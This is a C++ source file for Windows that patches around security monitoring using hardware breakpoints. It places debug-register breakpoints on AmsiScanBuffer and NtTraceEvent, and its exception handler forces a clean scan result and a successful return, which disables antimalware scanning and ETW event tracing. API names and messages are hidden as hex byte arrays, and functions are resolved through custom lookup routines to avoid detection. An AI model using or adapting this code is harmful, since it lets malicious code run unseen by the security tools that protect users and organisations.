#include <Windows.h>
#include <cstdio>
#include <ntstatus.h>

#include "winternal.h"

// Ensure NT_SUCCESS is defined.
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// --- Static Strings (as before) ---

static const char s_err_get_thread_context[] = {
    0x5B,0x2D,0x5D,0x20,0x47,0x65,0x74,0x54,0x68,0x72,0x65,0x61,0x64,0x43,0x6F,0x6E,
    0x74,0x65,0x78,0x74,0x20,0x66,0x61,0x69,0x6C,0x65,0x64,0x20,0x77,0x69,0x74,0x68,
    0x20,0x65,0x72,0x72,0x6F,0x72,0x3A,0x20,0x25,0x6C,0x75,0x0A,0x00
}; // "[-] GetThreadContext failed with error: %lu\n"

static const char s_err_invalid_slot[] = {
    0x5B,0x2D,0x5D,0x20,0x49,0x6E,0x76,0x61,0x6C,0x69,0x64,0x20,0x62,0x72,0x65,0x61,
    0x6B,0x70,0x6F,0x69,0x6E,0x74,0x20,0x73,0x6C,0x6F,0x74,0x3A,0x20,0x25,0x75,0x0A,
    0x00
}; // "[-] Invalid breakpoint slot: %u\n"

static const char s_err_ntcontinue_not_found[] = {
    0x5B,0x2D,0x5D,0x20,0x4E,0x74,0x43,0x6F,0x6E,0x74,0x69,0x6E,0x75,0x65,0x20,0x6E,
    0x6F,0x74,0x20,0x66,0x6F,0x75,0x6E,0x64,0x2E,0x0A,0x00
}; // "[-] NtContinue not found.\n"

static const char s_err_ntcontinue_failed[] = {
    0x5B,0x2D,0x5D,0x20,0x4E,0x74,0x43,0x6F,0x6E,0x74,0x69,0x6E,0x75,0x65,0x20,0x66,
    0x61,0x69,0x6C,0x65,0x64,0x20,0x77,0x69,0x74,0x68,0x20,0x73,0x74,0x61,0x74,0x75,
    0x73,0x3A,0x20,0x30,0x78,0x25,0x6C,0x78,0x0A,0x00
}; // "[-] NtContinue failed with status: 0x%lx\n"

static const char s_amsi_scan_buffer[] = {
    0x41,0x6D,0x73,0x69,0x53,0x63,0x61,0x6E,0x42,0x75,0x66,0x66,0x65,0x72,0x00
}; // "AmsiScanBuffer"

static const char s_nt_trace_event[] = {
    0x4E,0x74,0x54,0x72,0x61,0x63,0x65,0x45,0x76,0x65,0x6E,0x74,0x00
}; // "NtTraceEvent"

static const char s_nt_continue[] = {
    0x4E,0x74,0x43,0x6F,0x6E,0x74,0x69,0x6E,0x75,0x65,0x00
}; // "NtContinue"

// Narrow string for ntdll.dll is not used now; we use the wide version.
static const WCHAR s_ntdll_dll_w[] = {
    0x006E,0x0074,0x0064,0x006C,0x006C,0x002E,0x0064,0x006C,0x006C,0x0000
}; // L"ntdll.dll"

// Wide string for amsi.dll.
static const WCHAR s_amsi_dll_w[] = {
    0x0061,0x006D,0x0073,0x0069,0x002E,0x0064,0x006C,0x006C,0x0000
}; // L"amsi.dll"

// --- Modified Functions Using Replacement APIs ---

// Reimplementation of setting a hardware breakpoint on the current thread.
// "slot" should be 0, 1, 2, or 3. "targetAddr" is the address to break on.
bool SetUniqueHardwareBreakpoint(unsigned int slot, void* targetAddr) {
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        std::printf(s_err_get_thread_context, GetLastError());
        return false;
    }

    // Choose the correct debug register.
    switch (slot) {
    case 0: ctx.Dr0 = reinterpret_cast<DWORD_PTR>(targetAddr); break;
    case 1: ctx.Dr1 = reinterpret_cast<DWORD_PTR>(targetAddr); break;
    case 2: ctx.Dr2 = reinterpret_cast<DWORD_PTR>(targetAddr); break;
    case 3: ctx.Dr3 = reinterpret_cast<DWORD_PTR>(targetAddr); break;
    default:
        std::printf(s_err_invalid_slot, slot);
        return false;
    }

    // Clear any existing configuration for this slot.
    ctx.Dr7 &= ~(0xFULL << (16 + slot * 4));

    // Enable the breakpoint in this slot.
    ctx.Dr7 |= (1ULL << (slot * 2));

    // Use NtContinue to resume execution with our modified context.
    typedef NTSTATUS(NTAPI* NtContinue_t)(PCONTEXT, BOOLEAN);
    NtContinue_t NtContinueFunc = reinterpret_cast<NtContinue_t>(
        GetProcAddressReplacement(GetModuleHandleReplacement(s_ntdll_dll_w), s_nt_continue)
        );
    if (!NtContinueFunc) {
        std::printf(s_err_ntcontinue_not_found);
        return false;
    }
    NTSTATUS status = NtContinueFunc(&ctx, FALSE);
    if (!NT_SUCCESS(status)) {
        std::printf(s_err_ntcontinue_failed, status);
        return false;
    }
    // (If NtContinue succeeds, this function will not return.)
    return true;
}

// Exception handler for unique hardware breakpoints.
// This function checks if the single-step exception occurred at one of our known addresses
// and, if so, patches the context to simulate a successful function return.
LONG HandleUniqueHwbpException(PEXCEPTION_POINTERS exPtrs) {
    HMODULE hAmsi = GetModuleHandleReplacement(s_amsi_dll_w);
    void* addrAmsi = hAmsi ? GetProcAddressReplacement(hAmsi, s_amsi_scan_buffer) : nullptr;
    HMODULE hNtdll = GetModuleHandleReplacement(s_ntdll_dll_w);
    void* addrNtTrace = hNtdll ? GetProcAddressReplacement(hNtdll, s_nt_trace_event) : nullptr;

    EXCEPTION_RECORD* exRec = exPtrs->ExceptionRecord;
    CONTEXT* ctx = exPtrs->ContextRecord;

    if (exRec->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;

    uintptr_t exAddr = reinterpret_cast<uintptr_t>(exRec->ExceptionAddress);
    if (addrAmsi && exAddr == reinterpret_cast<uintptr_t>(addrAmsi)) {
        // For the AmsiScanBuffer breakpoint:
        DWORD64 retAddr = *reinterpret_cast<DWORD64*>(ctx->Rsp);
        DWORD64* pScanResult = reinterpret_cast<DWORD64*>(
            *reinterpret_cast<DWORD64*>(ctx->Rsp + 6 * sizeof(PVOID))
            );
        if (pScanResult) {
            *pScanResult = 0;
        }
        ctx->Rip = retAddr;
        ctx->Rsp += sizeof(PVOID);
        ctx->Rax = S_OK;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    else if (addrNtTrace && exAddr == reinterpret_cast<uintptr_t>(addrNtTrace)) {
        // For the NtTraceEvent breakpoint:
        ctx->Rip = *reinterpret_cast<DWORD64*>(ctx->Rsp);
        ctx->Rsp += sizeof(PVOID);
        ctx->Rax = STATUS_SUCCESS;
        return EXCEPTION_CONTINUE_EXECUTION;
    }

    return EXCEPTION_CONTINUE_SEARCH;
}
